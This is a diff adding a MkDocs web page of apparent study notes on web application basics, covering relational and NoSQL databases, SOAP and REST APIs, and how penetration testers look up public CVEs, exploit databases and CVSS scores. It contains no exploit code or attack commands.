+<td>Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design</td>
+</tr>
+</tbody>
+</table>
+<p>Other common SQL databases include: <code>SQLite</code>, <code>MariaDB</code>, <code>Amazon</code> <code>Aurora</code>, and <code>Azure</code> SQL.</p>
+<h4 id="non-relational-nosql">Non-relational (NoSQL)</h4>
+<p>A non-relational database does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.</p>
+<p>Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.</p>
+<p>There are 4 common storage models for NoSQL databases:</p>
+<ul>
+<li>Key-Value</li>
+<li>Document-Based</li>
+<li>Wide-Column</li>
+<li>Graph</li>
+</ul>
+<p>Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:</p>
+<p><img alt="webaps-non" src="../img/web_apps_non-relational_db.jpg" /></p>
+<p>Some of the most common NoSQL databases include:</p>
+<table>
+<thead>
+<tr>
+<th><strong>Type</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MongoDB</td>
+<td>The most common NoSQL database. It is free and open-source, uses the</td>
+</tr>
+<tr>
+<td>ElasticSearch</td>
+<td>Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient</td>
+</tr>
+<tr>
+<td>Apache Cassandra</td>
+<td>Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values</td>
+</tr>
+</tbody>
+</table>
+<p>Other common NoSQL databases include: Redis, Neo4j, CouchDB, and Amazon DynamoDB.</p>
+<h3 id="development-frameworks-apis">Development Frameworks &amp; APIs</h3>
+<p>In addition to web servers that can host web applications in various languages, there are many common web development frameworks that help in developing core web application files and functionality. With the increased complexity of web applications, it may be challenging to create a modern and sophisticated web application from scratch. Hence, most of the popular web applications are developed using web frameworks.</p>
+<h3 id="web-apis">Web APIs</h3>
+<p>An API (Application Programming Interface) is an interface within an application that specifies how the application can interact with other applications. For Web Applications, it is what allows remote access to functionality on back end components. APIs are not exclusive to web applications and are used for software applications in general. Web APIs are usually accessed over the HTTP protocol and are usually handled and translated through web servers.</p>
+<p><img alt="api" src="../img/api_examples.jpg" /></p>
+<p>A weather web application, for example, may have a certain API to retrieve the current weather for a certain city. We can request the API URL and pass the city name or city id, and it would return the current weather in a JSON object. Another example is Twitter&rsquo;s API, which allows us to retrieve the latest Tweets from a certain account in XML or JSON formats, and even allows us to send a Tweet &lsquo;if authenticated&rsquo;, and so on.</p>
+<p>To enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like <code>SOAP</code> or <code>REST</code>.</p>
+<h4 id="soap">SOAP</h4>
+<p>The SOAP (Simple Objects Access) standard shares data through XML, where the request is made in XML through an HTTP request, and the response is also returned in XML. Front end components are designed to parse this XML output properly. </p>
+<h4 id="rest">REST</h4>
+<p>The REST (Representational State Transfer) standard shares data through the URL path &lsquo;i.e. search/users/1&rsquo;, and usually returns the output in JSON format &lsquo;i.e. userid 1&rsquo;.</p>
+<h3 id="public-cve">Public CVE</h3>
+<p>As many organizations deploy web applications that are publicly used, like open-source and proprietary web applications, these web applications tend to be tested by many organizations and experts around the world. This leads to frequently uncovering a large number of vulnerabilities, most of which get patched and then shared publicly and assigned a CVE (<a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">Common Vulnerabilities and Exposures</a>) record and score.</p>
+<p>Many penetration testers also make proof of concept exploits to test whether a certain public vulnerability can be exploited and usually make these exploits available for public use, for testing and educational purposes. This makes searching for public exploits the very first step we must go through for web applications</p>
+<p>Tip: The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.</p>
+<p>Once we identify the web application version, we can search Google for public exploits for this version of the web application. We can also utilize online exploit databases, like <a href="https://www.exploit-db.com/">Exploit DB</a>, <a href="https://www.rapid7.com/db/">Rapid7 DB</a>, or <a href="https://www.vulnerability-lab.com/">Vulnerability Lab</a>. The following example shows a search for WordPress public exploits in Rapid7 DB:</p>
+<p><img alt="rapid" src="../img/rapid7-db.jpg" /></p>
+<p>We would usually be interested in exploits with a CVE score of 8-10 or exploits that lead to <code>Remote Code Execution</code>. Other types of public exploits should also be considered if none of the above is available.</p>
+<h3 id="common-vulnerability-scoring-system-cvss">Common Vulnerability Scoring System (CVSS)</h3>
+<p>The Common Vulnerability Scoring System (CVSS) is an open-source industry standard for assessing the severity of security vulnerabilities. This scoring system is often used as a standard measurement for organizations and governments that need to produce accurate and consistent severity scores for their systems&rsquo; vulnerabilities. This helps with the prioritization of resources and the response to a given threat.</p>
+<p><a href="https://nvd.nist.gov/search">Nist</a> search for CVSS</p>
+
+              
+            </article>
+            
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var tab,labels=set.querySelector(".tabbed-labels");for(tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../bb/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Bounty101" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Bounty101
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../web_req/" class="md-footer__link md-footer__link--next" aria-label="Next: Web Requests" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Web Requests
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2022 slehee
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "..", "features": ["content.tabs.link", "navigation.instant", "navigation.tracking", "navigation.tabs"], "search": "../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.6c7ad80a.min.js"></script>
+      
+    
+  </body>
+</html>
